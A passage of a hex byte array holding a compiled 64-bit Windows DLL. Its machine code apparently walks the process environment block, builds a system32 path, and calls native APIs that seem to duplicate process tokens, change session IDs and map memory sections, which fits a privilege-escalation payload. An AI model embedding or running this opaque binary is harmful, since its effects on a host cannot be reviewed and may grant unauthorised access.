	0xB5, 0xE0, 0x2D, 0xD9, 0x3A, 0x69, 0x2F, 0xD8, 0x52, 0x69, 0x63, 0x68, 0x3B, 0x69, 0x2F, 0xD8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x04, 0x00,
	0x67, 0xF0, 0xD4, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x20,
	0x0B, 0x02, 0x0E, 0x2C, 0x00, 0x18, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x50, 0x20, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
	0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x71, 0x34, 0x00, 0x00, 0x02, 0x00, 0x60, 0x01, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
	0xD0, 0x35, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00, 0x80, 0x36, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x44, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xD4, 0x31, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x30, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x3D, 0x17, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x18, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x02, 0x0B, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
	0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x74, 0x08, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x44, 0x01, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x2A, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x83, 0xEC, 0x48, 0x44, 0x0F, 0xB7, 0xD1, 0x4C, 0x8D, 0x4C, 0x24, 0x34, 0x41, 0xC1, 0xE2,
	0x10, 0x4C, 0x8B, 0xDA, 0x49, 0x81, 0xCA, 0x41, 0x6C, 0x00, 0x00, 0x66, 0xC7, 0x44, 0x24, 0x3E,
	0x2D, 0x5F, 0x49, 0xC1, 0xE2, 0x20, 0x41, 0xB0, 0x61, 0x49, 0x81, 0xCA, 0xCB, 0x09, 0x06, 0x03,
	0x32, 0xD2, 0x0F, 0xB6, 0xCA, 0x41, 0x8D, 0x40, 0xE0, 0x41, 0x88, 0x41, 0xCC, 0x8D, 0x42, 0x61,
	0x88, 0x44, 0x0C, 0x1A, 0x80, 0xFA, 0x0A, 0x73, 0x05, 0x2C, 0x31, 0x41, 0x88, 0x01, 0xFE, 0xC2,
	0x49, 0xFF, 0xC1, 0x41, 0xFE, 0xC0, 0x80, 0xFA, 0x1A, 0x7C, 0xD7, 0x49, 0x8B, 0xCA, 0x41, 0x83,
	0xE2, 0x3F, 0x48, 0xC1, 0xE9, 0x05, 0x48, 0x8B, 0xD1, 0x83, 0xE1, 0x3F, 0x48, 0xC1, 0xEA, 0x05,
	0x42, 0x0F, 0xBE, 0x04, 0x14, 0x66, 0x41, 0x89, 0x03, 0x0F, 0xBE, 0x04, 0x0C, 0x48, 0x8B, 0xCA,
	0x66, 0x41, 0x89, 0x43, 0x02, 0x83, 0xE2, 0x3F, 0x48, 0xC1, 0xE9, 0x05, 0x0F, 0xBE, 0x04, 0x14,
	0x48, 0x8B, 0xD1, 0x66, 0x41, 0x89, 0x43, 0x04, 0x48, 0xC1, 0xEA, 0x05, 0x0F, 0xB6, 0xC1, 0x4C,
	0x8B, 0xC2, 0x49, 0xC1, 0xE8, 0x05, 0x0F, 0xBE, 0x0C, 0x04, 0x0F, 0xB6, 0xC2, 0x66, 0x41, 0x89,
	0x4B, 0x06, 0x0F, 0xBE, 0x0C, 0x04, 0x66, 0x41, 0x89, 0x4B, 0x08, 0x49, 0x8B, 0xC8, 0x48, 0xC1,
	0xE9, 0x05, 0x41, 0x83, 0xE0, 0x3F, 0x48, 0x8B, 0xD1, 0x83, 0xE1, 0x3F, 0x48, 0xC1, 0xEA, 0x05,
	0x42, 0x0F, 0xBE, 0x04, 0x04, 0x66, 0x41, 0x89, 0x43, 0x0A, 0x0F, 0xBE, 0x04, 0x0C, 0x48, 0x8B,
	0xCA, 0x66, 0x41, 0x89, 0x43, 0x0C, 0x83, 0xE2, 0x3F, 0x48, 0xC1, 0xE9, 0x05, 0x0F, 0xBE, 0x04,
	0x14, 0x48, 0x8B, 0xD1, 0x66, 0x41, 0x89, 0x43, 0x0E, 0x83, 0xE1, 0x3F, 0x48, 0xC1, 0xEA, 0x05,
	0x0F, 0xBE, 0x04, 0x0C, 0x48, 0x8B, 0xCA, 0x66, 0x41, 0x89, 0x43, 0x10, 0x83, 0xE2, 0x3F, 0x48,
	0xC1, 0xE9, 0x05, 0x0F, 0xBE, 0x04, 0x14, 0x48, 0x8B, 0xD1, 0x66, 0x41, 0x89, 0x43, 0x12, 0x83,
	0xE1, 0x3F, 0x48, 0xC1, 0xEA, 0x05, 0x0F, 0xBE, 0x04, 0x0C, 0x66, 0x41, 0x89, 0x43, 0x14, 0x48,
	0x8B, 0xC2, 0x83, 0xE0, 0x3F, 0x48, 0xC1, 0xEA, 0x05, 0x83, 0xE2, 0x3F, 0x0F, 0xBE, 0x04, 0x04,
	0x66, 0x41, 0x89, 0x43, 0x16, 0x0F, 0xBE, 0x04, 0x14, 0x66, 0x41, 0x89, 0x43, 0x18, 0x33, 0xC0,
	0x66, 0x41, 0x89, 0x43, 0x1A, 0x48, 0x83, 0xC4, 0x48, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x7C, 0x24, 0x20, 0x55, 0x48, 0x8D, 0x6C, 0x24, 0xA0, 0x48, 0x81, 0xEC, 0x60, 0x01,
	0x00, 0x00, 0x33, 0xC0, 0x48, 0xC7, 0x85, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x8D, 0x7C, 0x24, 0x60, 0xC7, 0x45, 0x70, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x00, 0x01, 0x00, 0x00,
	0x66, 0xC7, 0x45, 0x74, 0x00, 0x01, 0xF3, 0xAA, 0x0F, 0x57, 0xC0, 0xC7, 0x44, 0x24, 0x30, 0x30,
	0x00, 0x00, 0x00, 0x0F, 0x57, 0xC9, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x66,
	0x65, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x60, 0xF3, 0x0F, 0x7F, 0x44, 0x24, 0x38, 0xF3, 0x0F,
	0x7F, 0x4C, 0x24, 0x50, 0xE8, 0x37, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x54, 0x24, 0x60, 0x48, 0x8D,
	0x4C, 0x24, 0x20, 0xFF, 0x15, 0x97, 0x1E, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8D, 0x4C, 0x24, 0x20,
	0xFF, 0x15, 0x6A, 0x1E, 0x00, 0x00, 0x48, 0x89, 0x45, 0x78, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xAA,
	0x00, 0x00, 0x00, 0xB9, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x92, 0x1E, 0x00, 0x00, 0x44, 0x8B,
	0xC0, 0xBA, 0x08, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x1B, 0x1E, 0x00, 0x00, 0x48, 0x8B, 0xF8,
	0x48, 0x85, 0xC0, 0x74, 0x78, 0x41, 0xB0, 0x01, 0x48, 0x8D, 0x55, 0x70, 0x48, 0x8B, 0xC8, 0xFF,
	0x15, 0xFB, 0x1D, 0x00, 0x00, 0x33, 0xD2, 0x85, 0xC0, 0x78, 0x48, 0x48, 0x8B, 0xCF, 0xFF, 0x15,
	0x04, 0x1E, 0x00, 0x00, 0x48, 0x8B, 0xD7, 0x48, 0x8D, 0x4D, 0x78, 0xC7, 0x00, 0x00, 0x00, 0x00,
	0x00, 0xFF, 0x15, 0x99, 0x1E, 0x00, 0x00, 0x85, 0xC0, 0x79, 0x0B, 0x48, 0x8B, 0xCF, 0xFF, 0x15,
	0x3C, 0x1E, 0x00, 0x00, 0xEB, 0x37, 0x4C, 0x8B, 0x4D, 0x78, 0x4C, 0x8D, 0x44, 0x24, 0x30, 0xBA,
	0x00, 0x00, 0x00, 0x02, 0x48, 0x8D, 0x8D, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x67, 0x1E, 0x00,
	0x00, 0xEB, 0x1A, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC7, 0x48,
	0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x23, 0x1E, 0x00, 0x00, 0x48, 0x8B, 0x4D,
	0x78, 0x48, 0x85, 0xC9, 0x74, 0x06, 0xFF, 0x15, 0xB4, 0x1D, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x80,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0xBC, 0x24, 0x88, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x60, 0x01,
	0x00, 0x00, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x40, 0x55, 0x53, 0x56, 0x41, 0x56, 0x48, 0x8D, 0xAC, 0x24, 0x28, 0xF7, 0xFF, 0xFF, 0x48, 0x81,
	0xEC, 0xD8, 0x09, 0x00, 0x00, 0x33, 0xDB, 0x48, 0xC7, 0x85, 0x18, 0x09, 0x00, 0x00, 0x00, 0x10,
	0x00, 0x00, 0x48, 0x89, 0x9D, 0x08, 0x09, 0x00, 0x00, 0x4C, 0x8B, 0xF1, 0x48, 0x89, 0x9D, 0x10,
	0x09, 0x00, 0x00, 0xE8, 0x58, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84,
	0x70, 0x01, 0x00, 0x00, 0x48, 0x89, 0xBC, 0x24, 0xD0, 0x09, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x90,
	0x33, 0xC0, 0x48, 0x8D, 0x7D, 0x90, 0xB9, 0x00, 0x01, 0x00, 0x00, 0xF3, 0xAA, 0xB9, 0x64, 0x63,
	0x00, 0x00, 0xE8, 0xC9, 0xFC, 0xFF, 0xFF, 0x48, 0x8D, 0x55, 0x90, 0x48, 0x8D, 0x4C, 0x24, 0x50,
	0xFF, 0x15, 0x2A, 0x1D, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x50, 0xC7, 0x44, 0x24, 0x60, 0x30,
	0x00, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x70, 0x4C, 0x8D, 0x44, 0x24, 0x60,
	0x48, 0x89, 0x74, 0x24, 0x68, 0xBA, 0x1F, 0x00, 0x0F, 0x00, 0xC7, 0x44, 0x24, 0x78, 0x40, 0x00,
	0x00, 0x00, 0x48, 0x8D, 0x8D, 0x08, 0x09, 0x00, 0x00, 0xF3, 0x0F, 0x7F, 0x45, 0x80, 0xFF, 0x15,
	0x74, 0x1D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xE7, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8D, 0x08,
	0x09, 0x00, 0x00, 0x48, 0x8D, 0x85, 0x18, 0x09, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x48, 0x02, 0x00,
	0x00, 0x00, 0x4C, 0x8D, 0x85, 0x10, 0x09, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x10,
	0x00, 0x45, 0x33, 0xC9, 0xC7, 0x44, 0x24, 0x38, 0x02, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0xFF,
	0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x89, 0x5C, 0x24, 0x28, 0x48, 0xC7, 0x44,
	0x24, 0x20, 0x00, 0x10, 0x00, 0x00, 0xFF, 0x15, 0x2C, 0x1D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88,
	0x82, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x95, 0x10, 0x09, 0x00, 0x00, 0x48, 0x8D, 0xBD, 0x90, 0x00,
	0x00, 0x00, 0x33, 0xC0, 0xB9, 0x34, 0x08, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8D, 0x8D, 0x90, 0x00,
	0x00, 0x00, 0x41, 0xB8, 0x34, 0x08, 0x00, 0x00, 0xE8, 0xC3, 0x0C, 0x00, 0x00, 0x48, 0x8B, 0x95,
	0x08, 0x09, 0x00, 0x00, 0x48, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x15, 0xBF, 0x1C, 0x00,
	0x00, 0x8B, 0xBD, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0x90, 0x00, 0x00, 0x00, 0x41, 0xB8,
	0x34, 0x08, 0x00, 0x00, 0x89, 0x9D, 0x90, 0x00, 0x00, 0x00, 0x33, 0xC9, 0xFF, 0x15, 0x66, 0x1C,
	0x00, 0x00, 0x3B, 0xF8, 0x75, 0x20, 0x49, 0x8B, 0xCE, 0x89, 0xBD, 0x90, 0x00, 0x00, 0x00, 0x48,
	0x8D, 0x95, 0x90, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x34, 0x08, 0x00, 0x00, 0xE8, 0x6F, 0x0C, 0x00,
	0x00, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8D, 0x08, 0x09, 0x00, 0x00, 0xFF, 0x15, 0x25,
	0x1C, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x1C, 0x1C, 0x00, 0x00, 0x48, 0x8B, 0xBC, 0x24,
	0xD0, 0x09, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x81, 0xC4, 0xD8, 0x09, 0x00, 0x00, 0x41, 0x5E, 0x5E,
	0x5B, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x60, 0x48, 0x8B, 0xF9, 0x48, 0xC7, 0x44,
	0x24, 0x78, 0x00, 0x00, 0x00, 0x00, 0xE8, 0xA5, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0xD8, 0x48, 0x85,
	0xC0, 0x74, 0x70, 0x48, 0x8B, 0xD7, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x15, 0x9F, 0x1B, 0x00,
	0x00, 0x48, 0x8D, 0x44, 0x24, 0x20, 0xC7, 0x44, 0x24, 0x30, 0x30, 0x00, 0x00, 0x00, 0x0F, 0x57,
	0xC0, 0x48, 0x89, 0x44, 0x24, 0x40, 0x4C, 0x8D, 0x44, 0x24, 0x30, 0x48, 0x89, 0x5C, 0x24, 0x38,
	0xBA, 0x03, 0x00, 0x1F, 0x00, 0xC7, 0x44, 0x24, 0x48, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C,
	0x24, 0x78, 0xF3, 0x0F, 0x7F, 0x44, 0x24, 0x50, 0xFF, 0x15, 0x4A, 0x1B, 0x00, 0x00, 0x85, 0xC0,
	0x78, 0x18, 0x48, 0x8B, 0x4C, 0x24, 0x78, 0x33, 0xD2, 0xFF, 0x15, 0x91, 0x1B, 0x00, 0x00, 0x48,
	0x8B, 0x4C, 0x24, 0x78, 0xFF, 0x15, 0x6E, 0x1B, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x65,
	0x1B, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x70, 0x48, 0x83, 0xC4, 0x60, 0x5F, 0xC3, 0xCC, 0xCC,
	0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x38, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x80, 0x0F,
	0x05, 0xFD, 0x33, 0xC9, 0xFF, 0x15, 0x2E, 0x1B, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,
	0x44, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x55, 0x53, 0x41, 0x54, 0x41, 0x55,
	0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0xAC, 0x24, 0x68, 0xF9, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0x98,
	0x07, 0x00, 0x00, 0x33, 0xDB, 0xC7, 0x44, 0x24, 0x60, 0x10, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5D,
	0x80, 0x4D, 0x8B, 0xF9, 0x48, 0x89, 0x5D, 0x88, 0x44, 0x8B, 0xF3, 0x44, 0x8B, 0xE3, 0x85, 0xD2,
	0x0F, 0x84, 0x18, 0x01, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x48, 0x60, 0x8B, 0x85, 0xE0, 0x06, 0x00, 0x00, 0x39, 0x81, 0xC0, 0x02, 0x00, 0x00, 0x0F,
	0x84, 0xF9, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x45, 0x80, 0xBA, 0xFF, 0x01, 0x0F, 0x00, 0x48, 0xC7,
	0xC1, 0xFF, 0xFF, 0xFF, 0xFF, 0x41, 0xBD, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x47, 0x1A, 0x00,
	0x00, 0x85, 0xC0, 0x0F, 0x88, 0x18, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x80, 0x4C, 0x8D, 0x85,
	0xD8, 0x06, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x68, 0x88, 0x9D, 0xD8, 0x06, 0x00, 0x00, 0x44,
	0x89, 0x6C, 0x24, 0x6C, 0x44, 0x89, 0x6C, 0x24, 0x68, 0x48, 0xC7, 0x44, 0x24, 0x70, 0x07, 0x00,
	0x00, 0x00, 0xC7, 0x44, 0x24, 0x78, 0x03, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xA8, 0x1A, 0x00, 0x00,
	0x8B, 0xC8, 0xFF, 0x15, 0xB0, 0x1A, 0x00, 0x00, 0x8B, 0xC8, 0xFF, 0x15, 0xD0, 0x1A, 0x00, 0x00,
	0x38, 0x9D, 0xD8, 0x06, 0x00, 0x00, 0x0F, 0x84, 0xC5, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x80,
	0x48, 0x8D, 0x45, 0xA0, 0x48, 0x89, 0x45, 0x60, 0x4C, 0x8D, 0x45, 0x38, 0x48, 0x8D, 0x45, 0x88,
	0xC7, 0x45, 0xA0, 0x0C, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC9, 0xBA,
	0xFF, 0x01, 0x0F, 0x00, 0x44, 0x89, 0x6C, 0x24, 0x20, 0xC7, 0x45, 0xA4, 0x02, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x5D, 0xA8, 0xC7, 0x45, 0x38, 0x30, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5D, 0x40, 0x89,
	0x5D, 0x50, 0x48, 0x89, 0x5D, 0x48, 0x48, 0x89, 0x5D, 0x58, 0xFF, 0x15, 0xB0, 0x19, 0x00, 0x00,
	0x85, 0xC0, 0x0F, 0x88, 0x69, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x88, 0x4C, 0x8D, 0x85, 0xE0,
	0x06, 0x00, 0x00, 0x41, 0xB9, 0x04, 0x00, 0x00, 0x00, 0xBA, 0x0C, 0x00, 0x00, 0x00, 0xFF, 0x15,
	0xB4, 0x19, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x45, 0x04, 0x00, 0x00, 0xEB, 0x03, 0x44, 0x8B,
	0xEB, 0x33, 0xC0, 0x48, 0x89, 0xB4, 0x24, 0xE8, 0x07, 0x00, 0x00, 0x48, 0x89, 0xBC, 0x24, 0x90,
	0x07, 0x00, 0x00, 0xB9, 0x0A, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x7D, 0x70, 0xC7, 0x45, 0x90, 0x5C,
	0x00, 0x73, 0x00, 0xF3, 0xAA, 0x48, 0x8D, 0x45, 0x70, 0xC7, 0x45, 0x94, 0x79, 0x00, 0x73, 0x00,
	0x41, 0xB9, 0x30, 0x00, 0xFE, 0x7F, 0x66, 0x89, 0x5D, 0x98, 0xC7, 0x44, 0x24, 0x68, 0x74, 0x00,
	0x65, 0x00, 0xBA, 0x5C, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x6C, 0x6D, 0x00, 0x33, 0x00, 0xBF,
	0x74, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x70, 0x32, 0x00, 0x5C, 0x00, 0x41, 0xB8, 0x6D, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x5C, 0x24, 0x74, 0x49, 0x3B, 0xC1, 0x74, 0x28, 0x41, 0x0F, 0xB7, 0x09,
	0x48, 0x8D, 0x45, 0x70, 0x66, 0x85, 0xC9, 0x74, 0x18, 0x4C, 0x8D, 0x55, 0x70, 0x4D, 0x2B, 0xCA,
	0x66, 0x89, 0x08, 0x48, 0x83, 0xC0, 0x02, 0x41, 0x0F, 0xB7, 0x0C, 0x01, 0x66, 0x85, 0xC9, 0x75,
	0xEF, 0x66, 0x89, 0x18, 0x48, 0x8D, 0x45, 0x70, 0x66, 0x39, 0x5D, 0x70, 0x74, 0x0B, 0x66, 0x90,
	0x48, 0x83, 0xC0, 0x02, 0x66, 0x39, 0x18, 0x75, 0xF7, 0x48, 0x8D, 0x4D, 0x90, 0x48, 0x2B, 0xC8,
	0x66, 0x89, 0x10, 0x48, 0x8D, 0x40, 0x02, 0x0F, 0xB7, 0x14, 0x01, 0x66, 0x85, 0xD2, 0x75, 0xF0,
	0x66, 0x89, 0x18, 0x48, 0x8D, 0x45, 0x70, 0x66, 0x39, 0x5D, 0x70, 0x74, 0x0C, 0x0F, 0x1F, 0x00,
	0x48, 0x83, 0xC0, 0x02, 0x66, 0x39, 0x18, 0x75, 0xF7, 0x48, 0x8D, 0x4C, 0x24, 0x68, 0x48, 0x2B,
	0xC8, 0x0F, 0x1F, 0x40, 0x00, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
